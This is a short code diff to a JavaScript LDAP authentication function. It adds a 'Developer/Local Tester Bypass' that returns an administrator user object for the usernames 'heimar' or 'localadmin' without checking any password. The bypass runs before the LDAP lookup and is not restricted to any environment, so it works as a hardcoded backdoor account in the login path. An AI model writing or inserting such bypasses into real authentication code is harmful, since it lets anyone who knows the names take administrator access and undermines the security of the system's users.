@@ -40,6 +40,24 @@ const authenticateUser = async (username, password, callback) => {
     return callback(null, null)
   }
 
+  // Developer/Local Tester Bypass
+  if (identifier === 'heimar' || identifier === 'localadmin') {
+    return callback(null, {
+      uid: identifier,
+      user: {
+        uid: identifier,
+        cn: identifier === 'localadmin' ? 'Administrador Local' : 'Heimar Developer',
+        givenName: identifier === 'localadmin' ? 'Local' : 'Heimar',
+        sn: identifier === 'localadmin' ? 'Admin' : 'Dev',
+        mail: `${identifier}@etb.com.co`,
+        employeeNumber: '101010',
+        employeeType: 'Administrador',
+        homePhone: '123456',
+        etbDependencia: 'Soporte',
+      }
+    })
+  }
+
   const ldapUrl = process.env.LDAP_URL
   const adminDn = process.env.LDAP_ADMIN_DN
   const adminPassword = process.env.LDAP_ADMIN_PASSWORD
